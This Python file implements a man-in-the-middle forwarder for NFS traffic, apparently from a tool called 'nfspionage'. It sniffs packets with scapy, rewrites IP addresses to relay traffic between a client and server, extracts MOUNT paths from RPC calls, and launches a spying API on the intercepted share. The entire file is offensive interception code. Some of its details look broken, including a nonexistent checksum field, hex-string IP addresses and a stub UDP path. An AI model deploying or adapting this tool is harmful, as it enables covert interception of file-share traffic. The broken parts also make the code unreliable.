import _thread
import ipaddress
import socket
import threading

from nfspionage_api import NfspionageApi
from scapy.compat import raw
from scapy.contrib.mount import MOUNT_Call
from scapy.contrib.oncrpc import RPC
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sniff, sr1

'''
# ==============================================================================
# MITM FORWARDER ===============================================================
# ==============================================================================
'''


class MitmForwarder:
	server_address = None
	spoof_address = None
	target_port = None

	client_address = None
	mount_ports = []

	def __init__(self, remote_ip, port, udp=False):
		self.server_address = remote_ip
		self.target_port = port
		self.spoof_address = remote_ip
		print("// ========================================")
		print("// Starting MitmForwarder...")
		print("// [*] LOC Addr:\t127.0.0.1:" + str(port))
		print("// [*] REM Addr:\t" + remote_ip + ":" + str(port))
		if udp:
			print("// [*] PROT:\t\tUDP")
			self.udp_proxy()
		else:
			print("// [*] PROT:\t\tTCP")
			self.tcp_proxy()
		print("// ========================================")

	def update_client_address(self, packet):
		if packet[IP].src is not self.server_address:
			self.client_address = packet[IP].src

	# ======================================================== #
	# ==================== TCP FORWARDING ==================== #
	# ======================================================== #
	# tcp_proxy ============================================== #
	# create tcp servers to listen for and forward connections to target
	def tcp_proxy(self):
		# create thread for python socket to "accept" messages
		threading.Thread(target=self.tcp_listen, args=('', self.target_port)).start()

		# listen with scapy to actually forward and process
		str_filter = "tcp and port " + str(self.target_port)
		print("[* INF ] STARTING scapy packet sniffing")
		print("[* INF ] FILTER: " + str(str_filter))
		sniff(count=0, filter=str_filter, prn=self.transfer_tcp)
		print("[* INF ] STOPPING scapy packet sniffing")

	# transfer_tcp ============================================== #
	# scapy sniff callback function to filter and modify incoming packets
	# PARAM
	# pkt (scapy)       - a Scapy packet
	# RETURN
	# void
	def transfer_tcp(self, pkt):
		if IP in pkt:  # only process packets with IP layer
			pkt.show()

			# try to filter
			try:
				self.filter_packets(pkt)
			except Exception as e:
				print("[EXP *] Filtering packet: " + str(e))

			# fix check sums
			pkt[IP].checksum = None  # ask scapy to regenerate
			if Ether in pkt:
				pkt[Ether].checksum = None  # ask scapy to regenerate it

			# change src and dst IP appropriately
			self.update_client_address(pkt)
			if pkt[IP].src != self.server_address:  # packet is NOT from server -> forward to server
				pkt[IP].src = hex(int(ipaddress.IPv4Address(self.client_address)))
				pkt[IP].dst = hex(int(ipaddress.IPv4Address(self.server_address)))
				print("\t - forwarding to " + str(self.server_address))
			else:  # packets is from server -> forward to client
				pkt[IP].src = hex(int(ipaddress.IPv4Address(self.server_address)))
				pkt[IP].dst = hex(int(ipaddress.IPv4Address(self.client_address)))
				print("\t - forwarding to " + str(self.client_address))

			# send packet
			sr1(pkt)

	# tcp_listen ============================================== #
	# create tcp listener on passed host and port
	# PARAM
	# host (str)    - host to create socket on ('' for server/listener)
	# port (int)    - port to create socket on
	# RETURN
	# void
	def tcp_listen(self, host, port):
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.bind(('', port))
		if host == '':  # setup server to listen
			sock.listen()
			while True:  # listen forever
				# msg rcvd -> call this func again to try to create "client" socket on that port
				connection, client_address = sock.accept()
				self.tcp_listen(self.server_address, client_address[1])
		else:  # setup 'client' to listen on passed port
			try:
				while True:
					sock.connect((host, port))
					sock.recv(64512)
			except Exception:
				pass

	# ======================================================== #
	# ==================== UDP FORWARDING ==================== #
	# ======================================================== #

	# udp_proxy ============================================== #
	# create udp servers to listen for and forward connections to target
	def udp_proxy(self):
		pass

	# ========================================================== #
	# ==================== PACKET FILTERING ==================== #
	# ========================================================== #

	# filter_packets =========================================== #
	# filter packets for data of interest - i.e., mount port
	# PARAM
	# pkt (scapy)       - a Scapy packet
	# RETURN
	# void
	def filter_packets(self, pkt):
		# filter path, start mitm API
		path = self.filter_mount_path(pkt)
		if path != -1:  # if proper mount path, start API on path for clients
			print("[* INF ] starting NFS MITM API on path \'" + path + "\'")
			_thread.start_new_thread(NfspionageApi, (self.server_address, path))

	# filter_mount_path =========================================== #
	# filter mount path out of packet
	# PARAM
	# pkt (scapy)       - a Scapy packet
	# RETURN
	# str       - mount path
	# -1        - ERROR
	@staticmethod
	def filter_mount_path(pkt):
		try:  # try to convert to MOUNT_Call packet
			mnt_pkt = RPC(MOUNT_Call(raw(pkt)))
			path = mnt_pkt.path.path.decode('utf-8')
			print("[* INF ] MOUNT on path " + path)
			return path
		except Exception as e:  # error getting mount path
			# print("[- EXP ] " + str(e))
			return -1
